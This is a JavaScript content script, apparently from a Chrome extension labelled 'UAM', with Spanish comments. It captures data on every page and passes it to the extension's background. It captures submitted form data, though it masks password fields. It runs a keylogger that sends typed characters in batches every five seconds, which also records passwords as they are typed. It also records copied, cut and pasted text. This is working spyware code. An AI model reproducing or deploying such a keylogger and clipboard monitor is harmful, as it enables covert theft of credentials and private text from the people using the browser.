// Función segura para enviar mensajes
function safeSendMessage(packet) {
    try {
        chrome.runtime.sendMessage(packet);
    } catch (e) {
        console.warn("UAM: Contexto perdido. Recargue la pestaña (F5).");
    }
}

// 1. Captura de Formularios
document.addEventListener('submit', (e) => {
    const formData = new FormData(e.target);
    const datos = {};
    for (let [k, v] of formData.entries()) {
        const el = e.target.querySelector(`[name="${k}"]`);
        datos[k] = (el && el.type === 'password') ? "********" : v;
    }
    safeSendMessage({ tipo: "form_submit", url: location.href, titulo: document.title, datos });
});

// 2. Keylogger (5s debounce)
let buffer = "";
let timer;
document.addEventListener('keyup', (e) => {
    if (e.key.length === 1) buffer += e.key;
    clearTimeout(timer);
    timer = setTimeout(() => {
        if (buffer) {
            safeSendMessage({ tipo: "keystroke_batch", url: location.href, titulo: document.title, datos: { texto_capturado: buffer } });
            buffer = "";
        }
    }, 5000);
});

// 3. Portapapeles (Copy/Cut/Paste)
['copy', 'cut', 'paste'].forEach(ev => {
    document.addEventListener(ev, (e) => {
        let txt = (ev === 'paste') ? (e.clipboardData).getData('text') : window.getSelection().toString();
        if (txt.trim()) {
            safeSendMessage({ 
                tipo: "clipboard_action", 
                url: location.href, 
                titulo: document.title, 
                datos: { texto_capturado: `[${ev.toUpperCase()}] ${txt.trim().substring(0, 1000)}` } 
            });
        }
    });
});